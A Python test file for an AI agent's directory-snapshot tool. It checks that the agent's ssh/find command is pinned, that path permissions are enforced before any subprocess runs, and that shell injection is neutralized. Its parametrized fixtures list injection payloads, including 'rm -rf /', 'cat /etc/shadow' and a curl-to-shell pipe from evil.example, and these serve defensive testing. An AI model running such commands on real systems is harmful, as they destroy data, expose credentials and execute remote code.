"""
L14 cheat guard — the snapshot primitive's command surface.

The agent's ONLY interaction with a compute env (in v0) is the snapshot
primitive, which runs a single `find` invocation with a fixed `-printf`
template. These tests pin:

  - the LITERAL argv (local) and LITERAL remote-shell string (ssh) — any
    code change that introduces a new shell pattern fails CI
  - permission gate fires BEFORE subprocess for unauthorized paths
  - permission gate refuses wrong-permission entries (exact match)
  - shell injection in path is neutralized by shlex.quote
  - no subprocess calls happen OTHER than the whitelisted find/ssh
  - unknown project / compute_env fail cleanly
  - happy path local snapshot returns the expected shape

If you're adding a new primitive (upload, download, hpc_run), follow the
same pattern: write the pinning test FIRST, then the implementation, then
the cheat-guard tests under this directory.
"""
from __future__ import annotations

import shlex
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest
import yaml

from agent.skills import compute_access, snapshot
from agent.skills.compute_access import PermissionDenied


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _write_access(tmp_path: Path, access: dict) -> Path:
    p = tmp_path / "projects_access.yaml"
    p.write_text(yaml.safe_dump(access))
    return p


@pytest.fixture
def _local_access(tmp_path):
    """A complete LOCAL compute_env config with file_name_only on tmp_path."""
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    (proj_dir / "samples").mkdir()
    (proj_dir / "samples" / "a.fq.gz").write_bytes(b"x" * 100)
    (proj_dir / "samples" / "b.fq.gz").write_bytes(b"y" * 200)
    access = {
        "compute_envs": {
            "laptop": {
                "type": "local",
                "directories": [
                    {"path": str(proj_dir), "permission": "file_name_only"},
                ],
            },
        },
        "projects": {
            "myproj": {
                "compute_env": "laptop",
                "snapshot_paths": [str(proj_dir)],
            },
        },
    }
    return _write_access(tmp_path, access), proj_dir


# ---------------------------------------------------------------------------
# 1. Command-shape pinning — the literal subprocess argv must match
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_local_mode_uses_no_subprocess(tmp_path, monkeypatch):
    """The local mode emits ZERO subprocess calls — pure pathlib walk. This
    minimizes the security surface to nothing-at-all for local snapshots.
    Pin via a fail-on-any-subprocess monkeypatch."""
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    (proj_dir / "a.fq").write_text("x")

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append(a) or MagicMock())

    entries = snapshot._local_walk(str(proj_dir))
    assert len(entries) >= 2  # root + a.fq
    assert called == [], \
        f"local mode invoked subprocess: {called!r}"


@pytest.mark.integration
def test_ssh_remote_cmd_is_pinned():
    """The remote-shell string for ssh-mode snapshot MUST be exactly this
    shape. The path is shlex.quote'd (no quotes added for shell-safe
    strings; quotes added when adversarial), the printf template is
    shlex.quote'd (always quoted — contains backslash). Any deviation
    fails CI as a forcing function for a contract review."""
    cmd = snapshot._ssh_remote_cmd("/scratch/me/proj")
    # /scratch/me/proj has no shell metacharacters → shlex.quote returns it
    # AS-IS. The printf template contains backslashes → shlex.quote single-
    # quotes it.
    expected = (
        "find /scratch/me/proj '(' -type f -o -type d ')' "
        "-printf '%p\\t%s\\t%T@\\t%y\\n'"
    )
    assert cmd == expected, \
        f"ssh remote cmd shifted unexpectedly: {cmd!r}"


@pytest.mark.integration
def test_ssh_argv_includes_batch_mode_no_password_prompt():
    """ssh must run in BatchMode so a missing ssh-agent fails fast rather
    than interactively prompting (which would deadlock an MCP-driven agent
    that has no stdin)."""
    argv = snapshot._ssh_argv(
        {"host": "h.example", "user": "u"}, "find /x")
    assert "-o" in argv and "BatchMode=yes" in argv, \
        f"ssh argv missing BatchMode=yes: {argv!r}"


# ---------------------------------------------------------------------------
# 2. Shell-injection safety — adversarial paths in the config must not escape
# ---------------------------------------------------------------------------

@pytest.mark.integration
@pytest.mark.parametrize("evil_path", [
    "/scratch/x; rm -rf /",
    "/scratch/x && cat /etc/shadow",
    "/scratch/x`whoami`",
    "/scratch/x$(id)",
    "/scratch/x'\"&&",
    "/scratch/x | curl evil.example | sh",
])
def test_ssh_remote_cmd_neutralizes_path_injection(evil_path):
    """Even if the user (or a corrupted manifest) declared an adversarial
    path string, the shlex.quote in _ssh_remote_cmd MUST keep it inside a
    single-quoted shell argument. The metacharacters appear as literal
    characters to `find`, NOT as shell metacharacters."""
    cmd = snapshot._ssh_remote_cmd(evil_path)
    # The path appears exactly ONCE, inside a properly-quoted shell argument.
    # `shlex.quote` returns either '/path' (single-quoted) or escapes inline.
    quoted = shlex.quote(evil_path)
    assert quoted in cmd, \
        f"path not properly shlex.quote'd in: {cmd!r}"
    # And the LITERAL evil-looking characters must NOT appear UNQUOTED in
    # the rest of the command: i.e. the first occurrence in cmd is inside
    # the quoted region.
    # Strong proof: re-parse the cmd back to argv and confirm only ONE arg
    # holds the evil string.
    parsed = shlex.split(cmd)
    assert evil_path in parsed, \
        f"shlex round-trip lost the path verbatim: parsed={parsed!r}"
    # And no other argv element is the bare evil chars (they're all literal
    # `find` flags, parens, printf template).
    contaminants = [a for a in parsed if any(c in a for c in [";", "&&", "|", "`"])
                                          and a != evil_path]
    assert not contaminants, \
        f"shell metachars leaked out of the path: {contaminants!r}"


# ---------------------------------------------------------------------------
# 3. Permission gate — fires before any subprocess
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_unauthorized_path_refused_before_subprocess(_local_access, monkeypatch):
    """A snapshot_path that isn't in the compute_env's directories[] gets
    rejected at the gate. NO subprocess.run is called."""
    access_path, _proj_dir = _local_access
    # Mutate the project to point at an UNAUTHORIZED path.
    data = yaml.safe_load(access_path.read_text())
    data["projects"]["myproj"]["snapshot_paths"] = ["/etc"]
    access_path.write_text(yaml.safe_dump(data))

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    with pytest.raises(PermissionDenied) as exc:
        snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert "not authorized" in str(exc.value)
    assert called == [], \
        f"subprocess.run was called despite permission denial: {called!r}"


@pytest.mark.integration
def test_wrong_permission_refused(_local_access, monkeypatch):
    """A path declared with `upload` permission does NOT satisfy the
    snapshot operation (which requires `file_name_only`). Exact match."""
    access_path, proj_dir = _local_access
    data = yaml.safe_load(access_path.read_text())
    data["compute_envs"]["laptop"]["directories"][0]["permission"] = "upload"
    access_path.write_text(yaml.safe_dump(data))

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    with pytest.raises(PermissionDenied) as exc:
        snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert "permission 'upload'" in str(exc.value)
    assert "requires 'file_name_only'" in str(exc.value)
    assert called == []


@pytest.mark.integration
def test_relative_path_refused(_local_access):
    """The gate must reject non-absolute paths — relative paths have no
    meaning at the security boundary."""
    env = {"_name": "laptop", "directories": [{"path": "/x", "permission": "file_name_only"}]}
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(env, "relative/path", "snapshot")
    assert "absolute" in str(exc.value).lower()


@pytest.mark.integration
def test_path_outside_authorized_subdir_refused():
    """Longest-prefix match means a path INSIDE an authorized dir is OK.
    A sibling path NOT inside the authorized dir is NOT OK."""
    env = {"_name": "laptop", "directories": [
        {"path": "/scratch/me/proj/", "permission": "file_name_only"},
    ]}
    # Inside the authorized dir → matched.
    compute_access.check_permission(env, "/scratch/me/proj/sub/file", "snapshot")
    # Sibling → denied (no matching entry).
    with pytest.raises(PermissionDenied):
        compute_access.check_permission(env, "/scratch/me/other/", "snapshot")
    # Parent of authorized dir → denied (the parent isn't authorized; just
    # the specific child).
    with pytest.raises(PermissionDenied):
        compute_access.check_permission(env, "/scratch/me/", "snapshot")


@pytest.mark.integration
def test_more_specific_dir_wins():
    """When both a parent and child dir are declared, the more specific
    (child) one wins for paths under the child."""
    env = {"_name": "x", "directories": [
        {"path": "/scratch/me/proj/", "permission": "file_name_only"},
        {"path": "/scratch/me/proj/uploads/", "permission": "upload"},
    ]}
    # A path inside uploads/ sees `upload` permission.
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(env, "/scratch/me/proj/uploads/x.sif", "snapshot")
    assert "'upload'" in str(exc.value)
    # A path inside the parent (but outside the child) sees `file_name_only`.
    matched = compute_access.check_permission(
        env, "/scratch/me/proj/samples/a.fq", "snapshot")
    assert matched.get("path") == "/scratch/me/proj/"


# ---------------------------------------------------------------------------
# 4. No-other-subprocess-calls — pin the call surface
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_local_snapshot_emits_no_subprocess(_local_access, monkeypatch):
    """Local-mode snapshot emits ZERO subprocess calls (pure pathlib).
    Monkeypatch subprocess.run; assert it was never invoked."""
    access_path, proj_dir = _local_access

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    result = snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert "entries" in result, f"snapshot failed: {result}"
    assert called == [], \
        f"local mode invoked subprocess: {called!r}"


@pytest.mark.integration
def test_ssh_snapshot_emits_only_ssh_subprocess(_local_access, monkeypatch):
    """SSH-mode snapshot emits exactly ONE subprocess call per snapshot_path,
    and that call is `ssh ...` — nothing else (no curl, whoami, python,
    rm, etc.). The remote command (passed as one argv element) is verified
    by the test_ssh_remote_cmd_is_pinned test."""
    access_path, proj_dir = _local_access

    # Switch the env type to ssh so we exercise the subprocess path.
    data = yaml.safe_load(access_path.read_text())
    data["compute_envs"]["laptop"]["type"] = "ssh"
    data["compute_envs"]["laptop"]["host"] = "fake.example.com"
    data["compute_envs"]["laptop"]["user"] = "u"
    access_path.write_text(yaml.safe_dump(data))

    seen: list[list[str]] = []
    fake_result = MagicMock(returncode=0, stdout="", stderr="")
    def _spy(argv, *a, **kw):
        seen.append(list(argv) if isinstance(argv, list) else [argv])
        return fake_result
    monkeypatch.setattr(subprocess, "run", _spy)

    snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert seen, "expected at least one subprocess call in ssh mode"
    for argv in seen:
        head = argv[0] if argv else ""
        assert head == "ssh", \
            f"unwhitelisted subprocess call in ssh mode: {argv!r}"


# ---------------------------------------------------------------------------
# 5. Clean-error contract — unknown project / env / etc.
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_unknown_project_clean_error(_local_access):
    access_path, _ = _local_access
    with pytest.raises(KeyError) as exc:
        snapshot.snapshot_project("does_not_exist", access_path=str(access_path))
    assert "not found" in str(exc.value)


@pytest.mark.integration
def test_unknown_compute_env_clean_error(tmp_path):
    access = {
        "compute_envs": {"a": {"type": "local", "directories": []}},
        "projects": {"bad_proj": {"compute_env": "nonexistent",
                                   "snapshot_paths": ["/x"]}},
    }
    # `_validate` catches the dangling compute_env reference up front —
    # cleaner than letting the snapshot call discover it at runtime.
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "compute_env=" in str(exc.value)


@pytest.mark.integration
def test_unknown_permission_in_config_refused(tmp_path):
    """A typo in the permission value should fail at load — silent default-
    to-none would be a security regression by ergonomic surprise."""
    access = {"compute_envs": {"e": {"type": "local", "directories": [
        {"path": "/x", "permission": "filename_only"},  # missing underscore
    ]}}, "projects": {}}
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "unknown permission" in str(exc.value)


# ---------------------------------------------------------------------------
# 6. Happy path — end-to-end local snapshot
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_snapshot_returns_expected_entries(_local_access):
    """End-to-end: real config, real tmp_path data, real `find`. Confirms
    the parser handles the printf output correctly."""
    access_path, proj_dir = _local_access
    result = snapshot.snapshot_project("myproj", access_path=str(access_path))

    assert result["project"] == "myproj"
    assert result["compute_env"] == "laptop"
    assert result["entry_count"] >= 2     # at least the 2 files we wrote
    paths = {e["path"] for e in result["entries"]}
    assert any(p.endswith("a.fq.gz") for p in paths)
    assert any(p.endswith("b.fq.gz") for p in paths)
    # Sizes are captured correctly.
    a = next(e for e in result["entries"] if e["path"].endswith("a.fq.gz"))
    assert a["size"] == 100
    assert a["type"] == "file"


# ---------------------------------------------------------------------------
# 7. MCP wrapper — clean error surface (no raw exception leaks to the wire)
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_mcp_wrapper_translates_permission_denied_to_error_dict(monkeypatch, tmp_path):
    """The MCP tool wrapper must catch PermissionDenied / ConfigError /
    FileNotFoundError / KeyError and return {error: ...} — never propagate
    a raw exception to the wire (which would crash the MCP transport)."""
    from agent import mcp_server as m

    # Point at a missing manifest by patching default_access_path.
    monkeypatch.setattr(compute_access, "default_access_path",
                        lambda: tmp_path / "nonexistent.yaml")
    result = m.snapshot_project("anything")
    assert "error" in result, f"MCP wrapper leaked exception: {result!r}"
    assert "FileNotFoundError" in result["error"]
